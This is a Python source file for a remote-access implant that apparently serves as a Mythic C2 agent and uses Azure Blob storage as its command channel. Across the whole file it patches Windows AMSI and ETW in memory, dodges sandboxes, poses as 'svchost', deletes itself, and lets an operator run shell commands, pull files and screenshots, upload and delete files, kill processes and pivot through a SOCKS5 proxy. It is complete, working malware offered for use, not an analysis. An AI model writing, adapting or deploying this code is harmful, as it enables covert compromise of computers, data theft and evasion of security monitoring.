#!/usr/bin/env python3
import json
import time
import random
import base64
import urllib.request
import urllib.error
import ssl
import uuid as uuid_lib
import socket
import platform
import os
import sys
import struct
import shutil
import signal
import datetime
import ctypes
import select

BLOB_ENDPOINT = "BLOB_ENDPOINT_PLACEHOLDER"
CONTAINER_NAME = "CONTAINER_NAME_PLACEHOLDER"
CONTAINER_SAS = "CONTAINER_SAS_PLACEHOLDER"
CALLBACK_INTERVAL = int("CALLBACK_INTERVAL_PLACEHOLDER" or "30")
CALLBACK_JITTER = int("CALLBACK_JITTER_PLACEHOLDER" or "10")
AGENT_UUID = "AGENT_UUID_PLACEHOLDER"
KILLDATE = "KILLDATE_PLACEHOLDER"

_IS_WINDOWS = platform.system() == "Windows"
_CREATE_NO_WINDOW = 0x08000000 if _IS_WINDOWS else 0


class AzureBlobAgent:
    def __init__(self):
        self.uuid = AGENT_UUID
        self.blob_endpoint = BLOB_ENDPOINT
        self.container_name = CONTAINER_NAME
        self.sas_token = CONTAINER_SAS
        self.callback_interval = CALLBACK_INTERVAL
        self.callback_jitter = CALLBACK_JITTER
        self.checked_in = False
        self.killdate = KILLDATE
        # TLS verification intentionally disabled: C2 infrastructure uses
        # dynamic endpoints with operator-controlled certs per engagement.
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        self._max_retries = 3
        self._retry_base_delay = 2
        # SOCKS proxy state: server_id -> socket
        self._socks_connections = {}
        self._socks_out = []

    # -- Evasion -----------------------------------------------------------

    def _patch_amsi(self):
        if not _IS_WINDOWS:
            return
        try:
            k32 = ctypes.windll.kernel32
            amsi = k32.LoadLibraryA(b"amsi.dll")
            if not amsi:
                return
            addr = k32.GetProcAddress(amsi, b"AmsiScanBuffer")
            if not addr:
                return
            patch = b"\xB8\x57\x00\x07\x80\xC3"
            old_protect = ctypes.c_ulong(0)
            k32.VirtualProtect(
                ctypes.c_void_p(addr), len(patch),
                0x40, ctypes.byref(old_protect),
            )
            ctypes.memmove(addr, patch, len(patch))
            k32.VirtualProtect(
                ctypes.c_void_p(addr), len(patch),
                old_protect.value, ctypes.byref(old_protect),
            )
        except Exception:
            pass

    def _patch_etw(self):
        if not _IS_WINDOWS:
            return
        try:
            k32 = ctypes.windll.kernel32
            ntdll = k32.GetModuleHandleA(b"ntdll.dll")
            if not ntdll:
                return
            addr = k32.GetProcAddress(ntdll, b"EtwEventWrite")
            if not addr:
                return
            patch = b"\x33\xC0\xC3"
            old_protect = ctypes.c_ulong(0)
            k32.VirtualProtect(
                ctypes.c_void_p(addr), len(patch),
                0x40, ctypes.byref(old_protect),
            )
            ctypes.memmove(addr, patch, len(patch))
            k32.VirtualProtect(
                ctypes.c_void_p(addr), len(patch),
                old_protect.value, ctypes.byref(old_protect),
            )
        except Exception:
            pass

    def _anti_sandbox(self):
        if not _IS_WINDOWS:
            return False
        try:
            import winreg
            vm_keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmci"),
            ]
            for hive, path in vm_keys:
                try:
                    winreg.OpenKey(hive, path)
                    return True
                except OSError:
                    pass
        except Exception:
            pass
        try:
            if os.cpu_count() is not None and os.cpu_count() < 2:
                return True
        except Exception:
            pass
        try:
            k32 = ctypes.windll.kernel32

            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_ulong),
                    ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]

            mem = MEMORYSTATUSEX()
            mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
            k32.GlobalMemoryStatusEx(ctypes.byref(mem))
            total_gb = mem.ullTotalPhys / (1024 ** 3)
            if total_gb < 2.0:
                return True
        except Exception:
            pass
        try:
            uptime_ms = ctypes.windll.kernel32.GetTickCount64()
            if uptime_ms < 600000:
                return True
        except Exception:
            pass
        try:
            t0 = time.perf_counter()
            time.sleep(0.5)
            elapsed = time.perf_counter() - t0
            if elapsed < 0.4:
                return True
        except Exception:
            pass
        return False

    def _enforce_killdate(self):
        if not self.killdate or self.killdate == "KILLDATE_PLACEHOLDER":
            return False
        try:
            kd = datetime.datetime.strptime(self.killdate, "%Y-%m-%d").date()
            if datetime.date.today() >= kd:
                self._self_delete()
                sys.exit(0)
        except Exception:
            pass
        return False

    def _self_delete(self):
        try:
            os.remove(sys.argv[0])
        except Exception:
            pass

    def _mask_process(self):
        if not _IS_WINDOWS:
            return
        try:
            ctypes.windll.kernel32.SetConsoleTitleW("svchost")
        except Exception:
            pass

    # -- Comms -------------------------------------------------------------

    def get_blob_url(self, blob_path):
        return f"{self.blob_endpoint}/{self.container_name}/{blob_path}?{self.sas_token}"

    def put_blob(self, blob_path, data):
        url = self.get_blob_url(blob_path)
        for attempt in range(self._max_retries):
            try:
                req = urllib.request.Request(
                    url, data=data, method="PUT",
                    headers={
                        "x-ms-blob-type": "BlockBlob",
                        "Content-Type": "application/octet-stream",
                        "Content-Length": str(len(data)),
                    },
                )
                with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as resp:
                    if resp.status in (200, 201):
                        return True
            except Exception:
                pass
            time.sleep(self._retry_base_delay * (2 ** attempt))
        return False

    def get_blob(self, blob_path):
        url = self.get_blob_url(blob_path)
        for attempt in range(self._max_retries):
            try:
                req = urllib.request.Request(url, method="GET")
                with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as resp:
                    return resp.read()
            except urllib.error.HTTPError as e:
                if e.code == 404:
                    return b""
            except Exception:
                pass
            if attempt < self._max_retries - 1:
                time.sleep(self._retry_base_delay * (2 ** attempt))
        return b""

    def delete_blob(self, blob_path):
        url = self.get_blob_url(blob_path)
        for attempt in range(self._max_retries):
            try:
                req = urllib.request.Request(
                    url, method="DELETE",
                    headers={
                        "x-ms-blob-type": "BlockBlob",
                        "Content-Type": "application/octet-stream",
                    },
                )
                with urllib.request.urlopen(req, context=self.ssl_context, timeout=30) as resp:
                    if resp.status in (200, 202):
                        return True
            except Exception:
                pass
            time.sleep(self._retry_base_delay * (2 ** attempt))
        return False

    def postMessageAndRetrieveResponseBlob(self, data):
        message_id = uuid_lib.uuid4()
        encoded = base64.b64encode((self.uuid + json.dumps(data)).encode())
        self.put_blob(f"ats/{message_id}.blob", encoded)
        response = b""
        while response == b"":
            time.sleep(self.get_sleep_time())
            response = self.get_blob(f"sta/{message_id}.blob")
        decoded = base64.b64decode(response).decode()
        parsed = json.loads(decoded[36:])
        self.delete_blob(f"sta/{message_id}.blob")
        return parsed

    # -- Helpers -----------------------------------------------------------

    def _get_ips(self):
        ips = []
        try:
            hostname = socket.gethostname()
            ips = socket.gethostbyname_ex(hostname)[2]
        except Exception:
            ips = ["127.0.0.1"]
        return ips

    def get_sleep_time(self):
        jitter_range = self.callback_interval * (self.callback_jitter / 100)
        jitter = random.uniform(-jitter_range, jitter_range)
        return max(1, int(self.callback_interval + jitter))

    def build_checkin_message(self):
        return {
            "action": "checkin",
            "uuid": self.uuid,
            "ips": self._get_ips(),
            "os": platform.system().lower(),
            "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
            "host": socket.gethostname(),
            "pid": os.getpid(),
            "architecture": platform.machine(),
            "domain": os.getenv("USERDOMAIN", ""),
            "integrity_level": 2,
            "external_ip": "",
            "process_name": sys.executable or sys.argv[0],
        }

    def build_get_tasking_message(self):
        return {"action": "get_tasking", "tasking_size": -1}

    def build_post_response(self, responses):
        return {"action": "post_response", "responses": responses}

    # -- Commands ----------------------------------------------------------

    def _parse_params(self, task):
        raw = task.get("parameters", "{}")
        if isinstance(raw, str):
            try:
                return json.loads(raw)
            except Exception:
                return {"command": raw} if raw else {}
        return raw if isinstance(raw, dict) else {}

    def _cmd_shell(self, task):
        import subprocess
        params = self._parse_params(task)
        cmd = params.get("command", "")
        if not cmd:
            return {"user_output": "No command specified", "status": "error"}
        kwargs = {
            "shell": True, "capture_output": True,
            "text": True, "timeout": 120,
        }
        if _IS_WINDOWS:
            kwargs["creationflags"] = _CREATE_NO_WINDOW
        result = subprocess.run(cmd, **kwargs)
        output = result.stdout
        if result.stderr:
            output += result.stderr
        return {"user_output": output}

    def _cmd_whoami(self, task):
        user = os.getenv("USER") or os.getenv("USERNAME") or "unknown"
        domain = os.getenv("USERDOMAIN", "")
        host = socket.gethostname()
        if domain:
            return {"user_output": f"{domain}\\{user}@{host}"}
        return {"user_output": f"{user}@{host}"}

    def _cmd_pwd(self, task):
        return {"user_output": os.getcwd()}

    def _cmd_hostname(self, task):
        return {"user_output": socket.gethostname()}

    def _cmd_exit(self, task):
        self._self_delete()
        sys.exit(0)

    def _cmd_ls(self, task):
        params = self._parse_params(task)
        target = params.get("path", params.get("command", "."))
        if not target:
            target = "."
        target = os.path.abspath(target)
        host = socket.gethostname()
        parent = os.path.dirname(target)
        dirname = os.path.basename(target) or target
        files = []
        try:
            with os.scandir(target) as it:
                for entry in it:
                    try:
                        stat = entry.stat()
                        files.append({
                            "name": entry.name,
                            "is_file": entry.is_file(),
                            "size": stat.st_size if entry.is_file() else 0,
                            "modify_time": int(stat.st_mtime * 1000),
                            "permissions": {},
                        })
                    except Exception:
                        files.append({
                            "name": entry.name,
                            "is_file": not entry.is_dir(),
                            "size": 0,
                            "modify_time": 0,
                            "permissions": {},
                        })
        except Exception as e:
            return {"user_output": str(e), "status": "error"}
        fb = {
            "host": host,
            "is_file": False,
            "name": dirname,
            "parent_path": parent,
            "success": True,
            "files": files,
        }
        return {"file_browser": fb}

    def _cmd_cd(self, task):
        params = self._parse_params(task)
        target = params.get("path", params.get("command", ""))
        if not target:
            return {"user_output": "No path specified", "status": "error"}
        os.chdir(target)
        return {"user_output": os.getcwd()}

    def _cmd_cat(self, task):
        params = self._parse_params(task)
        path = params.get("path", params.get("command", ""))
        if not path:
            return {"user_output": "No file specified", "status": "error"}
        with open(path, "r", errors="replace") as f:
            return {"user_output": f.read()}

    def _cmd_mkdir(self, task):
        params = self._parse_params(task)
        path = params.get("path", params.get("command", ""))
        if not path:
            return {"user_output": "No path specified", "status": "error"}
        os.makedirs(path, exist_ok=True)
        return {"user_output": f"Created {path}"}

    def _cmd_rm(self, task):
        params = self._parse_params(task)
        path = params.get("path", params.get("command", ""))
        if not path:
            return {"user_output": "No path specified", "status": "error"}
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)
        return {"user_output": f"Removed {path}"}

    def _cmd_cp(self, task):
        params = self._parse_params(task)
        src = params.get("source", "")
        dst = params.get("destination", "")
        if not src or not dst:
            return {"user_output": "Need source and destination", "status": "error"}
        if os.path.isdir(src):
            shutil.copytree(src, dst)
        else:
            shutil.copy2(src, dst)
        return {"user_output": f"Copied {src} -> {dst}"}

    def _cmd_mv(self, task):
        params = self._parse_params(task)
        src = params.get("source", "")
        dst = params.get("destination", "")
        if not src or not dst:
            return {"user_output": "Need source and destination", "status": "error"}
        shutil.move(src, dst)
        return {"user_output": f"Moved {src} -> {dst}"}

    def _cmd_download(self, task):
        params = self._parse_params(task)
        path = params.get("path", params.get("file", params.get("command", "")))
        if not path:
            return {"user_output": "No file specified", "status": "error"}
        full_path = os.path.abspath(path)
        with open(full_path, "rb") as f:
            raw = f.read()
        chunk_data = base64.b64encode(raw).decode()
        dl = {
            "total_chunks": 1,
            "chunk_num": 1,
            "chunk_data": chunk_data,
            "full_path": full_path,
            "is_screenshot": False,
        }
        return {"download": dl}

    def _cmd_upload(self, task):
        params = self._parse_params(task)
        file_data = params.get("file", params.get("chunk_data", ""))
        dest = params.get("remote_path", params.get("destination", params.get("path", "")))
        if not file_data or not dest:
            return {"user_output": "Need file data and destination path", "status": "error"}
        raw = base64.b64decode(file_data)
        dest = os.path.abspath(dest)
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        with open(dest, "wb") as f:
            f.write(raw)
        return {"user_output": f"Uploaded {len(raw)} bytes to {dest}"}

    def _cmd_ps(self, task):
        processes = []
        if _IS_WINDOWS:
            try:
                k32 = ctypes.windll.kernel32
                psapi = ctypes.windll.psapi
                arr = (ctypes.c_ulong * 2048)()
                needed = ctypes.c_ulong(0)
                psapi.EnumProcesses(
                    ctypes.byref(arr), ctypes.sizeof(arr),
                    ctypes.byref(needed),
                )
                count = needed.value // ctypes.sizeof(ctypes.c_ulong)
                for i in range(count):
                    pid = arr[i]
                    if pid == 0:
                        continue
                    handle = k32.OpenProcess(0x0410, False, pid)
                    name = ""
                    if handle:
                        try:
                            buf = ctypes.create_unicode_buffer(512)
                            psapi.GetProcessImageFileNameW(handle, buf, 512)
                            name = buf.value
                        except Exception:
                            pass
                        finally:
                            k32.CloseHandle(handle)
                    processes.append({
                        "process_id": pid,
                        "name": os.path.basename(name) if name else str(pid),
                        "parent_process_id": 0,
                        "user": "",
                        "architecture": platform.machine(),
                        "bin_path": name,
                    })
            except Exception:
                pass
        else:
            try:
                for entry in os.scandir("/proc"):
                    if not entry.name.isdigit():
                        continue
                    pid = int(entry.name)
                    name = ""
                    ppid = 0
                    try:
                        with open(f"/proc/{pid}/comm", "r") as f:
                            name = f.read().strip()
                    except Exception:
                        pass
                    try:
                        with open(f"/proc/{pid}/stat", "r") as f:
                            parts = f.read().split()
                            if len(parts) > 3:
                                ppid = int(parts[3])
                    except Exception:
                        pass
                    processes.append({
                        "process_id": pid,
                        "name": name,
                        "parent_process_id": ppid,
                        "user": "",
                        "architecture": platform.machine(),
                        "bin_path": "",
                    })
            except Exception:
                pass
        return {"processes": processes}

    def _cmd_env(self, task):
        lines = [f"{k}={v}" for k, v in sorted(os.environ.items())]
        return {"user_output": "\n".join(lines)}

    def _cmd_sleep(self, task):
        params = self._parse_params(task)
        interval = params.get("interval", None)
        jitter = params.get("jitter", None)
        if interval is not None:
            self.callback_interval = int(interval)
        if jitter is not None:
            self.callback_jitter = int(jitter)
        return {
            "user_output": f"Sleep: {self.callback_interval}s, Jitter: {self.callback_jitter}%"
        }

    def _cmd_sysinfo(self, task):
        u = platform.uname()
        info_lines = [
            f"System: {u.system}",
            f"Node: {u.node}",
            f"Release: {u.release}",
            f"Version: {u.version}",
            f"Machine: {u.machine}",
            f"Processor: {u.processor}",
            f"Architecture: {platform.architecture()[0]}",
            f"Python: {platform.python_version()}",
            f"PID: {os.getpid()}",
            f"CWD: {os.getcwd()}",
            f"User: {os.getenv('USER') or os.getenv('USERNAME') or 'unknown'}",
            f"Domain: {os.getenv('USERDOMAIN', '')}",
            f"IPs: {', '.join(self._get_ips())}",
        ]
        if _IS_WINDOWS:
            try:
                k32 = ctypes.windll.kernel32

                class MEMORYSTATUSEX(ctypes.Structure):
                    _fields_ = [
                        ("dwLength", ctypes.c_ulong),
                        ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong),
                        ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong),
                        ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong),
                        ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                    ]

                mem = MEMORYSTATUSEX()
                mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
                k32.GlobalMemoryStatusEx(ctypes.byref(mem))
                info_lines.append(
                    f"RAM: {mem.ullTotalPhys / (1024**3):.1f} GB total, "
                    f"{mem.ullAvailPhys / (1024**3):.1f} GB free"
                )
            except Exception:
                pass
        return {"user_output": "\n".join(info_lines)}

    def _cmd_kill(self, task):
        params = self._parse_params(task)
        pid = params.get("pid", 0)
        sig = params.get("signal", 9)
        if not pid:
            return {"user_output": "No PID specified", "status": "error"}
        os.kill(int(pid), int(sig))
        return {"user_output": f"Sent signal {sig} to PID {pid}"}

    def _cmd_screenshot(self, task):
        if _IS_WINDOWS:
            try:
                user32 = ctypes.windll.user32
                gdi32 = ctypes.windll.gdi32
                width = user32.GetSystemMetrics(0)
                height = user32.GetSystemMetrics(1)
                hdc_screen = user32.GetDC(0)
                hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
                hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
                gdi32.SelectObject(hdc_mem, hbmp)
                gdi32.BitBlt(
                    hdc_mem, 0, 0, width, height,
                    hdc_screen, 0, 0, 0x00CC0020,
                )

                class BITMAPINFOHEADER(ctypes.Structure):
                    _fields_ = [
                        ("biSize", ctypes.c_ulong),
                        ("biWidth", ctypes.c_long),
                        ("biHeight", ctypes.c_long),
                        ("biPlanes", ctypes.c_ushort),
                        ("biBitCount", ctypes.c_ushort),
                        ("biCompression", ctypes.c_ulong),
                        ("biSizeImage", ctypes.c_ulong),
                        ("biXPelsPerMeter", ctypes.c_long),
                        ("biYPelsPerMeter", ctypes.c_long),
                        ("biClrUsed", ctypes.c_ulong),
                        ("biClrImportant", ctypes.c_ulong),
                    ]

                bmi = BITMAPINFOHEADER()
                bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
                bmi.biWidth = width
                bmi.biHeight = -height
                bmi.biPlanes = 1
                bmi.biBitCount = 32
                bmi.biCompression = 0
                img_size = width * height * 4
                bmi.biSizeImage = img_size
                pixels = ctypes.create_string_buffer(img_size)
                gdi32.GetDIBits(
                    hdc_mem, hbmp, 0, height,
                    pixels, ctypes.byref(bmi), 0,
                )
                file_header = struct.pack(
                    "<2sIHHI", b"BM",
                    14 + 40 + img_size, 0, 0, 14 + 40,
                )
                info_header = struct.pack(
                    "<IiiHHIIiiII",
                    40, width, -height, 1, 32, 0,
                    img_size, 0, 0, 0, 0,
                )
                bmp_data = file_header + info_header + pixels.raw
                gdi32.DeleteObject(hbmp)
                gdi32.DeleteDC(hdc_mem)
                user32.ReleaseDC(0, hdc_screen)
                chunk_data = base64.b64encode(bmp_data).decode()
                return {
                    "download": {
                        "total_chunks": 1,
                        "chunk_num": 1,
                        "chunk_data": chunk_data,
                        "full_path": "screenshot.bmp",
                        "is_screenshot": True,
                    }
                }
            except Exception as e:
                return {"user_output": str(e), "status": "error"}
        else:
            try:
                import subprocess
                tmp = "/tmp/.scr.png"
                for tool in ["scrot", "xwd"]:
                    try:
                        if tool == "scrot":
                            subprocess.run(
                                ["scrot", tmp], capture_output=True, timeout=10,
                            )
                        else:
                            subprocess.run(
                                ["xwd", "-root", "-out", tmp],
                                capture_output=True, timeout=10,
                            )
                        if os.path.exists(tmp):
                            with open(tmp, "rb") as f:
                                raw = f.read()
                            os.remove(tmp)
                            return {
                                "download": {
                                    "total_chunks": 1,
                                    "chunk_num": 1,
                                    "chunk_data": base64.b64encode(raw).decode(),
                                    "full_path": "screenshot.png",
                                    "is_screenshot": True,
                                }
                            }
                    except Exception:
                        continue
            except Exception:
                pass
            return {"user_output": "Screenshot not available", "status": "error"}

    # -- SOCKS5 proxy engine -----------------------------------------------

    def _socks_connect(self, server_id, data):
        """Parse SOCKS5 connect request, establish TCP connection, queue response."""
        try:
            if len(data) < 4:
                self._socks_send_error(server_id)
                return
            ver = data[0]
            cmd = data[1]
            # ver must be 5, cmd must be 1 (CONNECT)
            if ver != 0x05 or cmd != 0x01:
                self._socks_send_error(server_id)
                return
            atyp = data[3]
            if atyp == 0x01:  # IPv4
                if len(data) < 10:
                    self._socks_send_error(server_id)
                    return
                addr = socket.inet_ntoa(data[4:8])
                port = struct.unpack("!H", data[8:10])[0]
            elif atyp == 0x03:  # Domain
                dlen = data[4]
                if len(data) < 5 + dlen + 2:
                    self._socks_send_error(server_id)
                    return
                addr = data[5:5 + dlen].decode("utf-8", errors="replace")
                port = struct.unpack("!H", data[5 + dlen:7 + dlen])[0]
            elif atyp == 0x04:  # IPv6
                if len(data) < 22:
                    self._socks_send_error(server_id)
                    return
                addr = socket.inet_ntop(socket.AF_INET6, data[4:20])
                port = struct.unpack("!H", data[20:22])[0]
            else:
                self._socks_send_error(server_id)
                return

            # Establish TCP connection to target
            if atyp == 0x04:
                sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((addr, port))
            sock.setblocking(False)
            self._socks_connections[server_id] = sock

            # SOCKS5 success response: ver=5, rep=0, rsv=0, atyp=1, bind 0.0.0.0:0
            reply = b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            self._socks_out.append({
                "server_id": server_id,
                "data": base64.b64encode(reply).decode(),
                "exit": False,
            })
        except Exception:
            self._socks_send_error(server_id)

    def _socks_send_error(self, server_id):
        """Queue a SOCKS5 connection-refused reply + close."""
        reply = b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00"
        self._socks_out.append({
            "server_id": server_id,
            "data": base64.b64encode(reply).decode(),
            "exit": True,
        })
        self._socks_close(server_id)

    def _socks_close(self, server_id):
        """Close and remove a SOCKS connection."""
        sock = self._socks_connections.pop(server_id, None)
        if sock:
            try:
                sock.close()
            except Exception:
                pass

    def _socks_process_from_server(self, socks_data):
        """Handle SOCKS messages from Mythic (connect requests, data, exits)."""
        for msg in socks_data:
            server_id = msg.get("server_id", 0)
            raw = base64.b64decode(msg.get("data", "")) if msg.get("data") else b""
            exit_flag = msg.get("exit", False)

            if exit_flag:
                self._socks_close(server_id)
                continue

            if server_id not in self._socks_connections:
                # New connection: parse SOCKS5 connect request
                if raw:
                    self._socks_connect(server_id, raw)
            else:
                # Existing connection: forward data to target
                if raw:
                    sock = self._socks_connections.get(server_id)
                    if sock:
                        try:
                            sock.sendall(raw)
                        except Exception:
                            self._socks_close(server_id)
                            self._socks_out.append({
                                "server_id": server_id,
                                "data": "",
                                "exit": True,
                            })

    def _socks_gather(self):
        """Read available data from all active SOCKS connections."""
        dead = []
        if not self._socks_connections:
            result = list(self._socks_out)
            self._socks_out.clear()
            return result

        readable_socks = list(self._socks_connections.keys())
        sock_list = [self._socks_connections[sid] for sid in readable_socks]

        try:
            readable, _, errored = select.select(sock_list, [], sock_list, 0.1)
        except Exception:
            readable, errored = [], []

        readable_set = set(id(s) for s in readable)
        errored_set = set(id(s) for s in errored)

        for sid in readable_socks:
            sock = self._socks_connections.get(sid)
            if not sock:
                continue
            if id(sock) in errored_set:
                dead.append(sid)
                continue
            if id(sock) in readable_set:
                try:
                    chunk = sock.recv(65536)
                    if chunk:
                        self._socks_out.append({
                            "server_id": sid,
                            "data": base64.b64encode(chunk).decode(),
                            "exit": False,
                        })
                    else:
                        dead.append(sid)
                except Exception:
                    dead.append(sid)

        for sid in dead:
            self._socks_close(sid)
            self._socks_out.append({
                "server_id": sid,
                "data": "",
                "exit": True,
            })

        result = list(self._socks_out)
        self._socks_out.clear()
        return result

    # -- Task dispatch -----------------------------------------------------

    def execute_task(self, task):
        task_id = task.get("id", str(uuid_lib.uuid4()))
        command = task.get("command", "")

        dispatch = {
            "shell": self._cmd_shell,
            "whoami": self._cmd_whoami,
            "pwd": self._cmd_pwd,
            "hostname": self._cmd_hostname,
            "exit": self._cmd_exit,
            "ls": self._cmd_ls,
            "cd": self._cmd_cd,
            "cat": self._cmd_cat,
            "mkdir": self._cmd_mkdir,
            "rm": self._cmd_rm,
            "cp": self._cmd_cp,
            "mv": self._cmd_mv,
            "download": self._cmd_download,
            "upload": self._cmd_upload,
            "ps": self._cmd_ps,
            "env": self._cmd_env,
            "sleep": self._cmd_sleep,
            "sysinfo": self._cmd_sysinfo,
            "kill": self._cmd_kill,
            "screenshot": self._cmd_screenshot,
        }

        response = {
            "task_id": task_id,
            "user_output": "",
            "completed": True,
            "status": "success",
        }

        handler = dispatch.get(command)
        if not handler:
            response["user_output"] = f"Unknown command: {command}"
            response["status"] = "error"
            return response

        try:
            result = handler(task)
            for key, val in result.items():
                response[key] = val
        except Exception as e:
            response["user_output"] = str(e)
            response["status"] = "error"

        return response

    # -- Main loop ---------------------------------------------------------

    def run(self):
        self._mask_process()
        self._patch_amsi()
        self._patch_etw()
        if self._anti_sandbox():
            sys.exit(0)

        while not self.checked_in:
            self._enforce_killdate()
            try:
                data = self.postMessageAndRetrieveResponseBlob(
                    self.build_checkin_message()
                )
                if (
                    data.get("action") == "checkin"
                    and data.get("status") == "success"
                ):
                    self.checked_in = True
                    self.uuid = data["id"]
                    break
            except Exception:
                pass
            time.sleep(self.get_sleep_time())

        while True:
            self._enforce_killdate()
            try:
                data = self.postMessageAndRetrieveResponseBlob(
                    self.build_get_tasking_message()
                )
                responses = []
                # Process tasks
                if "tasks" in data and data["tasks"]:
                    for task in data["tasks"]:
                        resp = self.execute_task(task)
                        responses.append(resp)
                # Process SOCKS data from Mythic
                if "socks" in data and data["socks"]:
                    self._socks_process_from_server(data["socks"])
                # Gather pending SOCKS data from active connections
                socks_out = self._socks_gather()
                # Post responses and/or SOCKS data
                if responses or socks_out:
                    msg = self.build_post_response(responses)
                    if socks_out:
                        msg["socks"] = socks_out
                    self.postMessageAndRetrieveResponseBlob(msg)
            except Exception:
                pass
            # Adaptive beaconing: fast poll when SOCKS connections are active
            if self._socks_connections:
                time.sleep(max(1, min(2, self.callback_interval // 10)))
            else:
                time.sleep(self.get_sleep_time())


if __name__ == "__main__":
    agent = AzureBlobAgent()
    agent.run()
